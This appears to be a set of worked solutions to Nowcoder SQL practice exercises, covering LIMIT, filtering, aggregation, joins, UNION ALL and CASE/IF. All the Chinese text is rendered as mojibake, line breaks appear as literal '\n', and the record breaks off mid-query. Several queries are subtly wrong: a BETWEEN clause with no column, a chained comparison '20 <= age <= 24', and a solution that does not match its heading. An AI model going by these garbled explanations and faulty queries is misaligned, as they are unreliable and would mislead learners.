**æŸ¥è¯¢ç»“æœé™åˆ¶è¿”å›è¡Œæ•°-LIMIT**\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥è¯¢ç»“æœé™åˆ¶è¿”å›è¡Œæ•°_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/c7ad0e2df4f647dfa5278e99894a7561?tpId=199&tqId=1971238&ru=/practice/82ebd89f12cf48efba0fecb392e193dd&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT device_id FROM user_profile LIMIT 2\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT device_id FROM user_profile LIMIT 0,2\n```\n\n- LIMIT å­å¥å¯ä»¥è¢«ç”¨äºå¼ºåˆ¶ SELECT è¯­å¥è¿”å›æŒ‡å®šçš„è®°å½•æ•°ã€‚\n\n- LIMIT æ¥å—ä¸€ä¸ªæˆ–ä¸¤ä¸ªæ•°å­—å‚æ•°ã€‚å‚æ•°å¿…é¡»æ˜¯ä¸€ä¸ªæ•´æ•°å¸¸é‡ã€‚\n  - å¦‚æœåªç»™å®šä¸€ä¸ªå‚æ•°ï¼Œå®ƒè¡¨ç¤ºè¿”å›æœ€å¤§çš„è®°å½•è¡Œæ•°ç›®ã€‚\n  - å¦‚æœç»™å®šä¸¤ä¸ªå‚æ•°ï¼Œç¬¬ä¸€ä¸ªå‚æ•°æŒ‡å®šç¬¬ä¸€ä¸ªè¿”å›è®°å½•è¡Œçš„åç§»é‡ï¼Œç¬¬äºŒä¸ªå‚æ•°æŒ‡å®šè¿”å›è®°å½•è¡Œçš„æœ€å¤§æ•°ç›®ã€‚\n  - ä¸ºäº†æ£€ç´¢ä»æŸä¸€ä¸ªåç§»é‡åˆ°è®°å½•é›†çš„ç»“æŸæ‰€æœ‰çš„è®°å½•è¡Œï¼Œå¯ä»¥æŒ‡å®šç¬¬äºŒä¸ªå‚æ•°ä¸º -1ã€‚\n- åˆå§‹è®°å½•è¡Œçš„åç§»é‡æ˜¯ 0(è€Œä¸æ˜¯ 1)ã€‚\n\n#### **SQL5** **å°†æŸ¥è¯¢åçš„åˆ—é‡æ–°å‘½å-AS**\n\né¢˜ç›®åœ°å€ï¼š[å°†æŸ¥è¯¢åçš„åˆ—é‡æ–°å‘½å_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/0d8f49aeaf7a4e1cb7fecec980712113?tpId=199&tqId=1971243&ru=/practice/c7ad0e2df4f647dfa5278e99894a7561&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id AS user_infos_example FROM user_profile LIMIT 2\n```\n\n### 02-æ¡ä»¶æŸ¥è¯¢\n\n#### SQL36 æŸ¥æ‰¾åæ’åº-ASC\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥æ‰¾åæ’åº_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/cd4c5f3a64b4411eb4810e28afed6f54?tpId=199&tqId=2002632&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,age FROM user_profile ORDER BY age ASC\n```\n\n- å‡åºï¼ˆASCï¼‰\n- é™åºï¼ˆDESCï¼‰\n\n#### SQL37 æŸ¥æ‰¾åå¤šåˆ—æ’åº-ORDER BY\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥æ‰¾åå¤šåˆ—æ’åº_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/39f74706f8d94d37865a82ffb7ba67d3?tpId=199&tqId=2002632&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,gpa,age FROM user_profile ORDER BY gpa ASC,age ASC\n```\n\n#### SQL38 æŸ¥æ‰¾åé™åºæ’åˆ—-DESC\n\né¢˜ç›®åœ°å€ï¼š\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,gpa,age FROM user_profile ORDER BY gpa DESC,age DESC\n```\n\n#### SQL6 æŸ¥æ‰¾å­¦æ ¡æ˜¯åŒ—å¤§çš„å­¦ç”Ÿä¿¡æ¯-=\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥æ‰¾å­¦æ ¡æ˜¯åŒ—å¤§çš„å­¦ç”Ÿä¿¡æ¯_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/7858f3e234bc4d85b81b9a6c3926f49f?tpId=199&tqId=1971248&ru=/practice/d023ae0191e0414ca1b19451099a39f1&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,university FROM user_profile WHERE university=\"åŒ—äº¬å¤§å­¦\"\n```\n\n#### SQL7 æŸ¥æ‰¾å¹´é¾„å¤§äº24å²çš„ç”¨æˆ·ä¿¡æ¯->\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥æ‰¾å¹´é¾„å¤§äº24å²çš„ç”¨æˆ·ä¿¡æ¯_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/2ae16bf2fd54415f99344e6024470d57?tpId=199&tqId=1971248&ru=%2Fpractice%2Fd023ae0191e0414ca1b19451099a39f1&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile WHERE age > 24\n```\n\n#### SQL8 æŸ¥æ‰¾æŸä¸ªå¹´é¾„æ®µçš„ç”¨æˆ·ä¿¡æ¯-BETWEEN AND\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥æ‰¾æŸä¸ªå¹´é¾„æ®µçš„ç”¨æˆ·ä¿¡æ¯_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/be54223075cc43ceb20e4ce8a8e3e340?tpId=199&tqId=1971248&ru=%2Fpractice%2Fd023ae0191e0414ca1b19451099a39f1&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking)\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT device_id,gender,age FROM user_profile WHERE age>=20 AND age<=23\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT device_id,gender,age FROM user_profile WHERE BETWEEN 20 AND 23\n```\n\n#### SQL9 æŸ¥æ‰¾é™¤å¤æ—¦å¤§å­¦çš„ç”¨æˆ·ä¿¡æ¯-NOT IN\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥æ‰¾é™¤å¤æ—¦å¤§å­¦çš„ç”¨æˆ·ä¿¡æ¯_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/c12a056497404d1ea782308a7b821f9c?tpId=199&tqId=1971248&ru=%2Fpractice%2Fd023ae0191e0414ca1b19451099a39f1&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking)\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile WHERE university NOT IN (\"å¤æ—¦å¤§å­¦\")\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile WHERE university != \"å¤æ—¦å¤§å­¦\"\n```\n\n#### SQL10 ç”¨whereè¿‡æ»¤ç©ºå€¼ç»ƒä¹ -IS NOT NULL\n\né¢˜ç›®åœ°å€ï¼š[ç”¨whereè¿‡æ»¤ç©ºå€¼ç»ƒä¹ _ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/08c9846a423540319eea4be44e339e35?tpId=199&tqId=1971605&ru=/practice/c12a056497404d1ea782308a7b821f9c&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,gender,age,university FROM user_profile WHERE age IS NOT NULL\n```\n\n#### SQL11 é«˜çº§æ“ä½œç¬¦ç»ƒä¹ (1)-AND\n\né¢˜ç›®åœ°å€ï¼š[é«˜çº§æ“ä½œç¬¦ç»ƒä¹ (1)_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/2d2e37474197488fbdf8f9206f66651c?tpId=199&tqId=1971781&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE gender = 'male' AND gpa > 3.5\n```\n\n#### SQL12 é«˜çº§æ“ä½œç¬¦ç»ƒä¹ (2)-OR\n\né¢˜ç›®åœ°å€ï¼š[é«˜çº§æ“ä½œç¬¦ç»ƒä¹ (2ï¼‰_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/25bcf6924eff417d90c8988f55675122?tpId=199&tqId=1971781&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE university = 'åŒ—äº¬å¤§å­¦' OR gpa > 3.7\n```\n\n#### SQL13 WHERE INå’ŒNOT IN\n\né¢˜ç›®åœ°å€ï¼š[Where in å’ŒNot in_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/0355033fc2244cdaa09b2bd6e794c762?tpId=199&tqId=1971781&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE university IN ('åŒ—äº¬å¤§å­¦','å¤æ—¦å¤§å­¦','å±±ä¸œå¤§å­¦')\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE university NOT IN ('æµ™æ±Ÿå¤§å­¦')\n```\n\n#### SQL14 æ“ä½œç¬¦æ··åˆè¿ç”¨-ORã€AND\n\né¢˜ç›®åœ°å€ï¼š[æ“ä½œç¬¦æ··åˆè¿ç”¨_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/d5ac4c878b63477fa5e5dfcb427d9102?tpId=199&tqId=1975665&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,gender,age,university,gpa FROM user_profile WHERE (university='å±±ä¸œå¤§å­¦' and gpa > 3.5)\nOR (university=\"å¤æ—¦å¤§å­¦\" and gpa > 3.8)\n```\n\n#### SQL15 æŸ¥çœ‹å­¦æ ¡åç§°ä¸­å«åŒ—äº¬çš„ç”¨æˆ·-LIKE\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥çœ‹å­¦æ ¡åç§°ä¸­å«åŒ—äº¬çš„ç”¨æˆ·_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/95d9922b1e2a49de80daa491889969ee?tpId=199&tqId=1975665&ru=%2Fexam%2Foj&qru=%2Fta%2Fsql-quick-study%2Fquestion-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT device_id,age,university FROM user_profile WHERE university LIKE \"%åŒ—äº¬%\"\n```\n\n- åˆ—å [NOT] LIKE\n\n- åŒ¹é…ä¸²ä¸­å¯åŒ…å«å¦‚ä¸‹å››ç§é€šé…ç¬¦ï¼š\n- _ï¼šåŒ¹é…ä»»æ„ä¸€ä¸ªå­—ç¬¦ï¼›\n- %ï¼šåŒ¹é…0ä¸ªæˆ–å¤šä¸ªå­—ç¬¦ï¼›\n- [ ]ï¼šåŒ¹é…[ ]ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦(è‹¥è¦æ¯”è¾ƒçš„å­—ç¬¦æ˜¯è¿ç»­çš„ï¼Œåˆ™å¯ä»¥ç”¨è¿å­—ç¬¦â€œ-â€è¡¨ è¾¾ )ï¼›\n- [^ ]ï¼šä¸åŒ¹é…[ ]ä¸­çš„ä»»æ„ä¸€ä¸ªå­—ç¬¦ã€‚\n\n### 03-é«˜çº§æŸ¥è¯¢\n\n#### **SQL16** **æŸ¥æ‰¾GPAæœ€é«˜å€¼-MAX**\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥æ‰¾GPAæœ€é«˜å€¼_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/4e22fc5dbd16414fb2c7683557a84a4f?tpId=199&tqId=1975668&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT MAX(gpa) FROM user_profile WHERE university=\"å¤æ—¦å¤§å­¦\"\n```\n\n#### SQL17 è®¡ç®—ç”·ç”Ÿäººæ•°ä»¥åŠå¹³å‡GPA-AVGã€ROUNDã€COUNT\n\né¢˜ç›®åœ°å€ï¼š[è®¡ç®—ç”·ç”Ÿäººæ•°ä»¥åŠå¹³å‡GPA_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/7d9a7b2d6b4241dbb5e5066d7549ca01?tpId=199&tqId=1975669&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT COUNT(gender) AS 'male_num',ROUND(AVG(gpa),1) AS 'avg_gpa' FROM user_profile WHERE gender=\"male\"\n```\n\n- æ­¤é¢˜è¦æ³¨æ„çš„æ˜¯æš—å«æ¡ä»¶ï¼Œä¿ç•™ä¸€ä½å°æ•°\n- ä½¿ç”¨ROUND()å‡½æ•°ï¼ŒROUNDè¿”å›ä¸€ä¸ªæ•°å€¼ï¼Œèˆå…¥åˆ°æŒ‡å®šçš„é•¿åº¦æˆ–ç²¾åº¦\n\n#### SQL18 åˆ†ç»„è®¡ç®—ç»ƒä¹ é¢˜-GROUP BY\n\né¢˜ç›®åœ°å€ï¼š[åˆ†ç»„è®¡ç®—ç»ƒä¹ é¢˜_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/009d8067d2df47fea429afe2e7b9de45?tpId=199&tqId=1975670&ru=/practice/7d9a7b2d6b4241dbb5e5066d7549ca01&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT gender,university,COUNT(device_id) AS 'user_num',AVG(active_days_within_30) AS 'avg_active_day',AVG(question_cnt) AS 'avg_question_cnt' FROM user_profile GROUP BY gender,university \n```\n\n#### SQL19 åˆ†ç»„è¿‡æ»¤ç»ƒä¹ é¢˜-HAVING\n\né¢˜ç›®åœ°å€ï¼š[åˆ†ç»„è¿‡æ»¤ç»ƒä¹ é¢˜_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/ddbcedcd9600403296038ee44a172f2d?tpId=199&tqId=1975671&ru=/practice/009d8067d2df47fea429afe2e7b9de45&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT university,AVG(question_cnt) AS 'avg_question_cnt',AVG(answer_cnt) AS 'avg_answer_cnt' FROM user_profile GROUP BY university HAVING avg_question_cnt < 5 OR avg_answer_cnt < 20 \n```\n\n- `HAVING`å­å¥æ¥æŒ‡å®šä¸€ç»„è¡Œæˆ–èšåˆçš„è¿‡æ»¤æ¡ä»¶ã€‚\n\n- `HAVING`å­å¥é€šå¸¸ä¸ GROUP BY å­å¥ä¸€èµ·ä½¿ç”¨\n\n#### SQL20 åˆ†ç»„æ’åºç»ƒä¹ é¢˜-ORDER BY\n\né¢˜ç›®åœ°å€ï¼š[åˆ†ç»„æ’åºç»ƒä¹ é¢˜_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/e00bbac732cb4b6bbc62a52b930cb15e?tpId=199&tqId=1975672&ru=/practice/ddbcedcd9600403296038ee44a172f2d&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT university,AVG(question_cnt) AS avg_question_cnt FROM user_profile GROUP BY university ORDER BY avg_question_cnt ASC\n```\n\n### 04-å¤šè¡¨æŸ¥è¯¢\n\n#### SQL21 æµ™æ±Ÿå¤§å­¦ç”¨æˆ·é¢˜ç›®å›ç­”æƒ…å†µ-WHERE IN\n\né¢˜ç›®åœ°å€ï¼š[æµ™æ±Ÿå¤§å­¦ç”¨æˆ·é¢˜ç›®å›ç­”æƒ…å†µ_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/55f3d94c3f4d47b69833b335867c06c1?tpId=199&tqId=1975673&ru=/practice/55f3d94c3f4d47b69833b335867c06c1&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£1ï¼š\n\n```sql\nSELECT device_id,question_id,result FROM question_practice_detail WHERE device_id \nIN (SELECT device_id FROM user_profile WHERE university='æµ™æ±Ÿå¤§å­¦')\n```\n\né¢˜è§£2ï¼š\n\n```sql\nSELECT t1.device_id, t1.question_id, t1.result\nFROM question_practice_detail AS t1\nINNER JOIN user_profile AS t2\nON t2.device_id = t1.device_id AND t2.university='æµ™æ±Ÿå¤§å­¦'\n```\n\n#### SQL22 ç»Ÿè®¡æ¯ä¸ªå­¦æ ¡çš„ç­”è¿‡é¢˜çš„ç”¨æˆ·çš„å¹³å‡ç­”é¢˜æ•°-INNER IN\n\né¢˜ç›®åœ°å€ï¼š[ç»Ÿè®¡æ¯ä¸ªå­¦æ ¡çš„ç­”è¿‡é¢˜çš„ç”¨æˆ·çš„å¹³å‡ç­”é¢˜æ•°_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/88aa923a9a674253b861a8fa56bac8e5?tpId=199&tqId=1975674&ru=/practice/55f3d94c3f4d47b69833b335867c06c1&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT t1.university, ROUND(COUNT(t2.question_id)/ COUNT(DISTINCT t2.device_id),4)AS avg_answer_cnt\nFROM question_practice_detail AS t2\nINNER JOIN user_profile as t1\nON t1.device_id = t2.device_id\nGROUP BY university\nORDER BY university ASC\n```\n\n#### SQL23 ç»Ÿè®¡æ¯ä¸ªå­¦æ ¡å„éš¾åº¦çš„ç”¨æˆ·å¹³å‡åˆ·é¢˜æ•°-LEFT JOIN\n\né¢˜ç›®åœ°å€ï¼š[ç»Ÿè®¡æ¯ä¸ªå­¦æ ¡å„éš¾åº¦çš„ç”¨æˆ·å¹³å‡åˆ·é¢˜æ•°_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/5400df085a034f88b2e17941ab338ee8?tpId=199&tqId=1975675&ru=/practice/88aa923a9a674253b861a8fa56bac8e5&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n é—®é¢˜åˆ†è§£ï¼š\n\n- æ¯ä¸ªå­¦æ ¡ï¼šæŒ‰å­¦æ ¡åˆ†ç»„`group by university`\n- ä¸åŒéš¾åº¦ï¼šæŒ‰éš¾åº¦åˆ†ç»„`group by difficult_level`\n- å¹³å‡ç­”é¢˜æ•°ï¼šæ€»ç­”é¢˜æ•°é™¤ä»¥æ€»äººæ•°`count(qpd.question_id) / count(distinct qpd.device_id)`\n- æ¥è‡ªä¸Šé¢ä¿¡æ¯ä¸‰ä¸ªè¡¨ï¼Œéœ€è¦è”è¡¨ï¼Œt1ä¸t2ç”¨device_idè¿æ¥ï¼Œt3ä¸t2ç”¨question_idè¿æ¥ã€‚\n\n```sql\nSELECT \n\t\tt1.university,\n\t\tt3.difficult_level,\n\t\tROUND(COUNT(t2.question_id) / COUNT(DISTINCT t2.device_id), 4) AS avg_answer_cnt\nFROM question_practice_detail AS t2\nLEFT JOIN user_profile AS t1\nON t1.device_id = t2.device_id\nLEFT JOIN question_detail AS t3\nON t3.question_id = t2.question_id\nGROUP BY t1.university, t3.difficult_level\n```\n\né¢˜è§£2:\n\n```sql\nSELECT \n    t1.university,\n    t3.difficult_level,\n    ROUND(COUNT(t2.question_id) / COUNT(DISTINCT t2.device_id),4) AS avg_answer_cnt\nFROM \n    user_profile t1,\n    question_practice_detail t2,\n    question_detail t3\nWHERE\n    t1.device_id = t2.device_id\n    and \n    t2.question_id = t3.question_id\nGROUP BY t1.university,t3.difficult_level;\n```\n\n#### SQL24 ç»Ÿè®¡æ¯ä¸ªç”¨æˆ·çš„å¹³å‡åˆ·é¢˜æ•°-INNER JOIN\n\né¢˜ç›®åœ°å€ï¼š[ç»Ÿè®¡æ¯ä¸ªç”¨æˆ·çš„å¹³å‡åˆ·é¢˜æ•°_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/f4714f7529404679b7f8909c96299ac4?tpId=199&tqId=1975676&ru=/ta/sql-quick-study&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT \n    t1.university,\n    t3.difficult_level,\n    ROUND(COUNT(t2.question_id) / COUNT(DISTINCT t2.device_id),4) AS avg_answer_cnt\nFROM \n    user_profile AS t1,\n    question_practice_detail AS t2,\n    question_detail AS t3\nWHERE\n    t1.device_id = t2.device_id\n    and\n    t2.question_id = t3.question_id\n    and\n    university =\"å±±ä¸œå¤§å­¦\"\nGROUP BY  t3.difficult_level\n```\n\né¢˜è§£2:\n\n```sql\nSELECT \n    university,\n    difficult_level,\n    ROUND(COUNT(t2.question_id) / COUNT(DISTINCT t2.device_id),4) AS avg_answer_cnt\nFROM question_practice_detail AS t2\nINNER JOIN user_profile AS t1\nON t1.device_id = t2.device_id AND t1.university=\"å±±ä¸œå¤§å­¦\"\nINNER JOIN question_detail AS t3\nON t3.question_id = t2.question_id\nGROUP BY difficult_level\n```\n\n#### SQL25 æŸ¥æ‰¾å±±ä¸œå¤§å­¦æˆ–è€…æ€§åˆ«ä¸ºç”·ç”Ÿçš„ä¿¡æ¯-UNION ALL\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥æ‰¾å±±ä¸œå¤§å­¦æˆ–è€…æ€§åˆ«ä¸ºç”·ç”Ÿçš„ä¿¡æ¯_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/979b1a5a16d44afaba5191b22152f64a?tpId=199&tqId=1975677&ru=/practice/f4714f7529404679b7f8909c96299ac4&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n- é™å®šæ¡ä»¶ï¼šå­¦æ ¡ä¸ºå±±ä¸œå¤§å­¦æˆ–è€…æ€§åˆ«ä¸ºç”·æ€§çš„ç”¨æˆ·ï¼š`university='å±±ä¸œå¤§å­¦'`, `gender='male'`ï¼›\n- åˆ†åˆ«æŸ¥çœ‹&ç»“æœä¸å»é‡ï¼šæ‰€ä»¥ç›´æ¥ä½¿ç”¨ä¸¤ä¸ªæ¡ä»¶çš„oræ˜¯ä¸è¡Œçš„ï¼Œç›´æ¥ç”¨unionä¹Ÿä¸è¡Œï¼Œè¦ç”¨union allï¼Œåˆ†åˆ«å»æŸ¥æ»¡è¶³æ¡ä»¶1çš„å’Œæ»¡è¶³æ¡ä»¶2çš„ï¼Œç„¶ååˆåœ¨ä¸€èµ·ä¸å»é‡\n\n- é»˜è®¤åœ°ï¼ŒUNION æ“ä½œç¬¦é€‰å–ä¸åŒçš„å€¼ã€‚å¦‚æœå…è®¸é‡å¤çš„å€¼ï¼Œè¯·ä½¿ç”¨ UNION ALL\n\n```sql\nSELECT device_id,gender,age,gpa\nFROM user_profile\nWHERE university='å±±ä¸œå¤§å­¦'\nUNION ALL\nSELECT device_id, gender, age, gpa\nFROM user_profile\nWHERE gender='male'\n```\n\n### 05-å¿…ä¼šçš„å¸¸ç”¨å‡½æ•°\n\n#### SQL26 è®¡ç®—25å²ä»¥ä¸Šå’Œä»¥ä¸‹çš„ç”¨æˆ·æ•°é‡-IFã€COUNT(*)\n\né¢˜ç›®åœ°å€ï¼š[è®¡ç®—25å²ä»¥ä¸Šå’Œä»¥ä¸‹çš„ç”¨æˆ·æ•°é‡_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/30f9f470390a4a8a8dd3b8e1f8c7a9fa?tpId=199&tqId=1975678&ru=/practice/979b1a5a16d44afaba5191b22152f64a&qru=/ta/sql-quick-study/question-ranking)\n\n**CASEå‡½æ•°**\n\næ˜¯ä¸€ç§å¤šåˆ†æ”¯çš„å‡½æ•°ï¼Œå¯ä»¥æ ¹æ®æ¡ä»¶åˆ—è¡¨çš„å€¼è¿”å›å¤šä¸ªå¯èƒ½çš„ç»“æœè¡¨è¾¾å¼ä¸­çš„ä¸€ä¸ªã€‚å¯ç”¨åœ¨ä»»ä½•å…è®¸ä½¿ç”¨è¡¨è¾¾å¼çš„åœ°æ–¹ï¼Œä½†ä¸èƒ½å•ç‹¬ä½œä¸ºä¸€ä¸ªè¯­å¥æ‰§è¡Œã€‚\n\n```sql\nCASE\nWHEN å¸ƒå°”è¡¨è¾¾å¼1 THEN ç»“æœè¡¨è¾¾å¼1\nWHEN å¸ƒå°”è¡¨è¾¾å¼2 THEN ç»“æœè¡¨è¾¾å¼2 â€¦\nWHEN å¸ƒå°”è¡¨è¾¾å¼n THEN ç»“æœè¡¨è¾¾å¼n\n[ ELSE ç»“æœè¡¨è¾¾å¼n+1 ]\nEND\n```\n\n**IFå‡½æ•°**\n\n```\nIF( expr1 , expr2 , expr3 )\n```\n\n- expr1 çš„å€¼ä¸º TRUEï¼Œåˆ™è¿”å›å€¼ä¸º expr2 \n- expr1 çš„å€¼ä¸ºFALSEï¼Œåˆ™è¿”å›å€¼ä¸º expr3\n\né¢˜è§£1:\n\n```sql\nSELECT CASE \n        WHEN age < 25 OR age is null THEN '25å²ä»¥ä¸‹'\n        WHEN age >= 25 THEN '25å²åŠä»¥ä¸Š'\n\t\t\t\tEND age_cut,COUNT(*) AS number\nFROM user_profile\nGROUP BY age_cut\n```\n\né¢˜è§£2:\n\n```sql\nSELECT CASE \n        WHEN age >= 25 THEN '25å²åŠä»¥ä¸Š'\n        ELSE '25å²ä»¥ä¸‹'\n\t\t\t\tEND age_cut,COUNT(*) AS number\nFROM user_profile\nGROUP BY age_cut\n```\n\né¢˜è§£3:\n\n```sql\nSELECT IF(age >= 25,\"25å²åŠä»¥ä¸Š\",\"25å²ä»¥ä¸‹\") AS age_cut,count(*) AS number\nFROM user_profile\nGROUP BY age_cut;\n```\n\n#### SQL27 æŸ¥çœ‹ä¸åŒå¹´é¾„æ®µçš„ç”¨æˆ·æ˜ç»†-CASE\n\né¢˜ç›®åœ°å€ï¼š[æŸ¥çœ‹ä¸åŒå¹´é¾„æ®µçš„ç”¨æˆ·æ˜ç»†_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/ae44b2b78525417b8b2fc2075b557592?tpId=199&tqId=1975679&ru=/exam/oj&qru=/ta/sql-quick-study/question-ranking&sourceUrl=%2Fexam%2Foj%3Ftab%3DSQL%E7%AF%87%26topicId%3D199)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT \n    device_id,\n    gender,\n    CASE \n        WHEN age >= 25 THEN \"25å²åŠä»¥ä¸Š\"\n        WHEN age < 20 THEN \"20å²ä»¥ä¸‹\"\n        WHEN 20 <= age <= 24 THEN \"20-24å²\"\n         ELSE \"å…¶ä»–\"\n    END AS age_cut\nFROM user_profile\n```\n\n#### SQL28 è®¡ç®—ç”¨æˆ·8æœˆæ¯å¤©çš„ç»ƒé¢˜æ•°é‡-YEAR\n\né¢˜ç›®åœ°å€ï¼š[è®¡ç®—ç”¨æˆ·8æœˆæ¯å¤©çš„ç»ƒé¢˜æ•°é‡_ç‰›å®¢é¢˜éœ¸_ç‰›å®¢ç½‘ (nowcoder.com)](https://www.nowcoder.com/practice/847373e2fe8d47b4a2c294bdb5bda8b6?tpId=199&tqId=1975680&ru=/practice/ae44b2b78525417b8b2fc2075b557592&qru=/ta/sql-quick-study/question-ranking)\n\né¢˜è§£ï¼š\n\n```sql\nSELECT DAY(date) AS day,COUNT(question_id) AS 